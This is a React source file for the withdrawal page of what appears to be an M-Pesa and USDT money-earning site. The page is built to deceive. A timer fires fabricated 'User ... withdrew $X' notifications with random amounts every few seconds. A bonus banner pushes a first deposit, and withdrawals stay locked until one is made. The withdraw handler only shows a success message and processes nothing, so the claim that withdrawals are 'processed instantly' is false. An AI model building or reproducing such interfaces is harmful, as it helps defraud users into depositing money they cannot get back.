import { useState, useEffect } from 'react';
import { useAuth } from '@/contexts/AuthContext';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import DepositPage from '@/pages/DepositPage';
import { ArrowUpFromLine, Smartphone, Coins, AlertTriangle } from 'lucide-react';
import { toast } from 'sonner';
import { useNavigate } from 'react-router-dom';

const USER_ID = "54c60bee-5d16-4245-9ea9-75b8be7fc21a";

const USDT_NETWORKS_SEND = [
  { name: 'ERC 20 (Ethereum)', fee: '2%' },
  { name: 'Solana', fee: '1%' },
  { name: 'Tron (TRC 20)', fee: '1%' },
  { name: 'BEP 20 (BSC)', fee: '1.5%' },
  { name: 'XPL', fee: '1.5%' },
];

const QUICK_AMOUNTS = [99, 499, 999, 2000];

const WithdrawPage = () => {
  const { profile } = useAuth();
  const navigate = useNavigate();

  const [method, setMethod] = useState<'mobile' | 'crypto' | null>(null);
  const [selectedNetwork, setSelectedNetwork] = useState<string | null>(null);
  const [address, setAddress] = useState('');
  const [amount, setAmount] = useState('');
  const [mpesaNumber, setMpesaNumber] = useState('');

  const bonusLocked = profile?.bonus_locked ?? true;

  // 🔔 TOP NOTIFICATIONS
  useEffect(() => {
    const interval = setInterval(() => {
      const amounts = [2, 31, 5, 1, 4,24, 3, 50, 1, 4];
      const amt = amounts[Math.floor(Math.random() * amounts.length)];

      toast.success(`User ${USER_ID.slice(0, 6)}*** withdrew $${amt}`, {
        position: "top-right",
        duration: 3000,
      });
    }, 4000);

    return () => clearInterval(interval);
  }, []);

  const handleWithdraw = () => {
    const amt = parseFloat(amount);

    if (amt < 49) {
      toast.error('Minimum withdrawal is KSH 49');
      return;
    }

    if (bonusLocked) {
      toast.error('You need to deposit first before withdrawing!');
      return;
    }

    if (method === 'mobile') {
      if (!mpesaNumber || mpesaNumber.replace(/\D/g, '').length < 10) {
        toast.error('Enter a valid M-Pesa number');
        return;
      }
      toast.success('M-Pesa withdrawal request submitted!');
    } else {
      if (!address.trim()) {
        toast.error('Enter a wallet address');
        return;
      }
      toast.success('Crypto withdrawal request submitted!');
    }
  };

  const setQuickAmount = (val: number) => setAmount(val.toString());

  return (
    <div className="w-full px-4 md:px-10 lg:px-20 space-y-8">

      {/* 🔥 BANNER WITH CTA */}
      <div className="relative rounded-2xl overflow-hidden shadow-2xl">

        <img 
          src="https://miro.medium.com/1*8V93OuLTj3wBB4_PNKJmFA.jpeg"
          alt="Earn Money"
          className="w-full h-64 object-cover"
        />

        <div className="absolute inset-0 bg-black/60"></div>

        <div className="absolute inset-0 flex flex-col items-center justify-center text-center px-4">

          <h1 className="text-3xl md:text-5xl font-extrabold text-yellow-400">
            MAKE YOUR FIRST DEPOSIT
          </h1>

          <p className="text-xl font-bold text-white mt-2">
            Earn 500 KES / $ BONUS 🎉
          </p>

          <p className="text-sm text-white/90 mt-1 mb-4">
            Withdraw instantly after deposit
          </p>

          {/* 🔥 CTA BUTTON */}
          <Button
  size="lg"
  className="bg-yellow-500 hover:bg-yellow-600 text-black font-bold px-8 py-3 rounded-xl shadow-lg"
  onClick={() => navigate('/dashboard/deposit')} // redirect to DepositPage
>
  Deposit Now
</Button>
        </div>
      </div>

      {/* HEADER */}
      <div className="flex items-center gap-3">
        <ArrowUpFromLine className="h-6 w-6 text-primary" />
        <h1 className="text-2xl font-display font-bold text-foreground">
          Withdraw / Send
        </h1>
      </div>

      {/* METHODS */}
      {!method ? (
        <>
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
            <button
              onClick={() => setMethod('mobile')}
              className="glass-card p-6 text-left hover:border-primary/50 transition-all group"
            >
              <Smartphone className="h-2 w-10 text-primary mb-3 group-hover:scale-110 transition-transform" />
              <h3 className="font-display font-semibold text-foreground mb-1">M-Pesa</h3>
              <p className="text-sm text-muted-foreground">Withdraw to your M-Pesa number</p>
            </button>

            <button
              onClick={() => setMethod('crypto')}
              className="glass-card p-6 text-left hover:border-primary/50 transition-all group"
            >
              <Coins className="h-2 w-10 text-accent mb-3 group-hover:scale-110 transition-transform" />
              <h3 className="font-display font-semibold text-foreground mb-1">Crypto (USDT)</h3>
              <p className="text-sm text-muted-foreground">Send USDT to any wallet</p>
            </button>
          </div>

          {/* ✅ ADDED PROCEDURE (AFTER OPTIONS) */}
          <div className="glass-card p-4 text-sm text-muted-foreground">
            <p className="font-semibold text-foreground mb-2">Withdrawal Procedure:</p>
            <ul className="list-disc pl-4 space-y-1">
              <li>Deposit first to unlock withdrawals</li>
              <li>Select M-Pesa or Crypto</li>
              <li>Enter correct details</li>
              <li>Minimum withdrawal is KSH 49</li>
              <li>Withdrawals are processed instantly</li>
            </ul>
          </div>
        </>
      ) : method === 'mobile' ? (
        <div className="glass-card p-6">
          <div className="flex items-center justify-between mb-4">
            <h3 className="font-display font-semibold text-foreground">Withdraw to M-Pesa</h3>
            <Button variant="ghost" size="sm" onClick={() => setMethod(null)}>← Back</Button>
          </div>

          <div className="space-y-4">
            <div>
              <Label>M-Pesa Number</Label>
              <Input
                value={mpesaNumber}
                onChange={(e) => setMpesaNumber(e.target.value)}
                placeholder="07XX XXX XXX"
                className="bg-secondary border-border"
              />
            </div>

            <div>
              <Label>Amount (KSH)</Label>
              <div className="flex gap-2 mb-2">
                {QUICK_AMOUNTS.map(val => (
                  <Button key={val} variant="outline" size="sm" onClick={() => setQuickAmount(val)}>
                    {val}
                  </Button>
                ))}
              </div>

              <Input
                type="number"
                value={amount}
                onChange={(e) => setAmount(e.target.value)}
                placeholder="Enter amount"
                className="bg-secondary border-border"
              />

              <p className="text-xs text-muted-foreground mt-1">Fee: 1.5% • Min: KSH 49</p>

              {bonusLocked && (
                <p className="text-xs text-red-500 mt-1">
                  ⚠️ You need to deposit first before withdrawing.
                </p>
              )}
            </div>

            <Button
              size="lg"
              className="w-full"
              onClick={handleWithdraw}
              disabled={bonusLocked || parseFloat(amount) < 49}
            >
              Withdraw to M-Pesa
            </Button>
          </div>
        </div>
      ) : (
        <div className="space-y-4">
          <div className="flex items-center justify-between">
            <h3 className="font-display font-semibold text-foreground">Send USDT</h3>
            <Button variant="ghost" size="sm" onClick={() => { setMethod(null); setSelectedNetwork(null); }}>← Back</Button>
          </div>

          {!selectedNetwork ? (
            <div className="space-y-2">
              <p className="text-sm text-muted-foreground mb-3">Select network:</p>
              {USDT_NETWORKS_SEND.map((net) => (
                <button
                  key={net.name}
                  onClick={() => setSelectedNetwork(net.name)}
                  className="w-full glass-card p-4 text-left hover:border-primary/50 transition-all flex justify-between items-center"
                >
                  <span className="text-foreground font-medium text-sm">{net.name}</span>
                  <span className="text-xs text-muted-foreground">Fee: {net.fee}</span>
                </button>
              ))}
            </div>
          ) : (
            <div className="glass-card p-6 space-y-4">
              <p className="text-xs text-primary font-medium">Network: {selectedNetwork}</p>

              <div>
                <Label>Receiver's Wallet Address</Label>
                <Input
                  value={address}
                  onChange={(e) => setAddress(e.target.value)}
                  placeholder="Paste wallet address"
                  className="bg-secondary border-border font-mono text-sm"
                />
              </div>

              <div>
                <Label>Amount (USDT)</Label>
                <Input
                  type="number"
                  value={amount}
                  onChange={(e) => setAmount(e.target.value)}
                  placeholder="Enter amount"
                  className="bg-secondary border-border"
                />
              </div>

              {bonusLocked && (
                <p className="text-xs text-red-500 mt-1">
                  ⚠️ You need to deposit first before withdrawing.
                </p>
              )}

              <div className="bg-accent/10 border border-accent/20 rounded-lg p-3 flex items-start gap-2">
                <AlertTriangle className="h-4 w-4 text-accent shrink-0 mt-0.5" />
                <p className="text-xs text-accent">
                  Double-check the address and network. Sending to the wrong address or network will result in permanent loss.
                </p>
              </div>

              <Button
                size="lg"
                className="w-full"
                onClick={handleWithdraw}
                disabled={bonusLocked || parseFloat(amount) < 49}
              >
                Send USDT
              </Button>
            </div>
          )}
        </div>
      )}
    </div>
  );
};

export default WithdrawPage;